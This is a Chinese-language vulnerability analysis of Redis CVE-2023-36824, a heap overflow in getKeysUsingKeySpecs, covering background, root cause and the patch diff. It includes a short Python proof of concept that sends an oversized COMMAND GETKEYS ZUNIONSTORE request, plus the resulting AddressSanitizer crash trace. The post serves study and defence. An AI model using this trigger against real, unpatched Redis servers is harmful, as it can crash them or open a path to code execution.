---
title: "Redis漏洞分析，命令篇"
excerpt: ''

collection: analysis
category: dbms
permalink: /analysis/redis-cmd
tags: 
  - redis

layout: single
read_time: true
author_profile: false
comments: true
share: true
related: true
---

![](../images/analysis/redis/redis.png)

## 分析流程

对Redis漏洞分析的流程分为4个步骤：

1. 寻找Moderate、High级别的漏洞，寻找脆弱版本和修复版本。
2. 编译源码，指定libc、ASAN选项。
``` shell
make MALLOC=libc CFLAGS="-fsanitize=address -fno-omit-frame-pointer -O0 -g" LDFLAGS="-fsanitize=address" -j4
```
3. 寻找PoC，没有则寻找Diff。
4. 从4个方面分析漏洞：前置知识、PoC、漏洞成因、补丁。

## CVE-2023-36824 堆溢出，可能导致RCE

披露时间：2023年7月
复现版本：7.0.8
修复版本：7.0.12

| 严重程度 | CWE | 攻击向量 | 攻击复杂度 | 需要权限 |
| :----:  | :----: | :----: | :----: | :----: |
| 7.4 / 10 |  CWE-122 Heap-based Buffer Overflow | Local | High | None |
| | CWE-131 Incorrect Calculation of Buffer Size |

### 一、前置知识

Redis命令键规范用于管理键的属性，比如界定键数量的first、last、step，开始搜索键的模式begin_search_type等等。
在一个复合命令COMMAND GETKEYS中这样的命令中，内部情况如下：
``` shell
COMMAND GETKEYS ZUNIONSTORE target key1 key2 key3
cmd->key_specs_num = 2
(last-first+1) = 1
(last-first+1) = 3
```
key_specs_num指示了命令规范的数量，其中每个规范的numkeys分别为1和3。

### 二、PoC

使用helper命令 *COMMAND GETKEYS* 与multi-keys命令 *ZUNIONSTORE* 构造长度大于256个键的PoC:
``` python
import pexpect

cli = "src/redis-cli"
proc = pexpect.spawn(cli)

cmd = 'COMMAND GETKEYS ZUNIONSTORE target '

num = 257
cmd += str(num) + ' '

for i in range(num):
    key = 'key' + str(i)
    cmd += key + ' '

proc.sendline(cmd)
proc.interact()
```
PoC触发了堆溢出，发生在src/db.c:1860，getKeysUsingKeySpecs函数中。
``` shell
==7965==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x51d000006c88 at pc 0x557d4324e07c bp 0x7fff1ac93e90 sp 0x7fff1ac93e88 WRITE of size 4 at 0x51d000006c88 thread T0
#0 0x557d4324e07b in getKeysUsingKeySpecs /opt/redis-7.0.8/src/db.c:1860
#1 0x557d4324e2ac in getKeysFromCommandWithSpecs /opt/redis-7.0.8/src/db.c:1906
#2 0x557d431ef637 in getKeysSubcommandImpl /opt/redis-7.0.8/src/server.c:4833
#3 0x557d431e6b51 in call /opt/redis-7.0.8/src/server.c:3374
#4 0x557d431eb7fc in processCommand /opt/redis-7.0.8/src/server.c:4008
#5 0x557d43229313 in processCommandAndResetClient /opt/redis-7.0.8/src/networking.c:2469
#6 0x557d43229313 in processInputBuffer /opt/redis-7.0.8/src/networking.c:2573
#7 0x557d4323186f in readQueryFromClient /opt/redis-7.0.8/src/networking.c:2709
#8 0x557d4340e294 in callHandler /opt/redis-7.0.8/src/connhelpers.h:79
#9 0x557d4340e294 in connSocketEventHandler /opt/redis-7.0.8/src/connection.c:310
#10 0x557d431cfcb9 in aeProcessEvents /opt/redis-7.0.8/src/ae.c:436
#11 0x557d431d224c in aeProcessEvents /opt/redis-7.0.8/src/ae.c:362
#12 0x557d431d224c in aeMain /opt/redis-7.0.8/src/ae.c:496
#13 0x557d431c40ac in main /opt/redis-7.0.8/src/server.c:7156
#14 0x7fd528ef4c89 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#15 0x7fd528ef4d44 in __libc_start_main_impl ../csu/libc-start.c:360
#16 0x557d431c5b70 in _start (/opt/redis-7.0.8/src/redis-server+0x10eb70) (BuildId: bae57496e088c12a62191271c8ba8cbf422ffc71)
```

### 三、漏洞成因

在src/db.c:1860，getKeysUsingKeySpecs函数中，堆溢出发生在keys的索引时。分析函数逻辑，在for循环中，k是不断增加的，所以keys的空间也要随之增加，而getKeysPrepareResult函数是根据当前的count进行调整的。因此发生堆溢出，溢出的大小为k，在这里k = count = 1。
``` c
int getKeysUsingKeySpecs(struct redisCommand *cmd, robj **argv, int argc, int search_flags, getKeysResult *result) {

    int j, i, k = 0, last, first, step;
    keyReference *keys;

    // cmd->key_specs_num = 2
    for (j = 0; j < cmd->key_specs_num; j++) {
        ...

        // count = 1
        // count = 257
        int count = ((last - first)+1);
        keys = getKeysPrepareResult(result, count);

        for (i = first; i <= last; i += step) {
            ...

            // src/db.c:1860, 堆溢出
👉          keys[k].pos = i;
            keys[k++].flags = spec->flags;
        }
        ...
    }

    result->numkeys = k;
    return k;
}
```

分析getKeysPrepareResult函数逻辑，由于getKeysUsingKeySpecs函数在for循环后才对result->numkeys进行赋值，因此函数中的memcpy不会执行。因此，即使利用k修补了getKeysUsingKeySpecs函数的堆溢出，这里仍然会产生逻辑漏洞。

``` c
keyReference *getKeysPrepareResult(getKeysResult *result, int numkeys) {

    /* Resize if necessary */
    if (numkeys > result->size) {
        if (result->keys != result->keysbuf) {
            /* We're not using a static buffer, just (re)alloc */
            result->keys = zrealloc(result->keys, numkeys * sizeof(keyReference));
        } else {
            /* We are using a static buffer, copy its contents */
            result->keys = zmalloc(numkeys * sizeof(keyReference));

            // result->numkeys = 0
👉          if (result->numkeys)
                memcpy(result->keys, result->keysbuf, result->numkeys * sizeof(keyReference));
        }
        result->size = numkeys;
    }

    return result->keys;
}
```

### 四、补丁

补丁利用result->numkeys取代k，同时修复了堆溢出、逻辑漏洞。

``` c
@@ -1937,7 +1938,7 @@ int getKeysUsingKeySpecs(struct redisCommand *cmd, robj **argv, int argc, ...) {

-   int j, i, k = 0, last, first, step;
+   int j, i, last, first, step;
    keyReference *keys;

+   result->numkeys = 0;

    for (j = 0; j < cmd->key_specs_num; j++) {
        ...

        int count = ((last - first)+1);
-       keys = getKeysPrepareResult(result, count);
+       keys = getKeysPrepareResult(result, result->numkeys + count);

        for (i = first; i <= last; i += step) {
            ...

-           keys[k].pos = i;
-           keys[k++].flags = spec->flags;
+           keys[result->numkeys].pos = i;
+           keys[result->numkeys].flags = spec->flags;
+           result->numkeys++;
        }
        ...
    }

-   result->numkeys = k;
-   return k;
+   return result->numkeys;

```



